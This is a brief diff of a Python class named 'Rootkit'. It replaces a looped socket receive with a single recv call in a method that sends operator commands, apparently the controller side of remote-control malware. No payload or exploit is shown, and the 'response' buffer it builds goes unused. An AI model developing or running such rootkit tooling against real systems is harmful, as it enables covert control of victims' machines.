@@ -43,11 +43,7 @@ class Rootkit:
             if command.startswith(pos_command[0]):
                 self.sock.sendall(command.encode())
                 response = bytes()
-                while True:
-                    data = self.sock.recv(1024)
-                    if not data:
-                        break
-                    response+=data
+                data = self.sock.recv(1024)
                 return data
         print("invalid command!")
         return -1
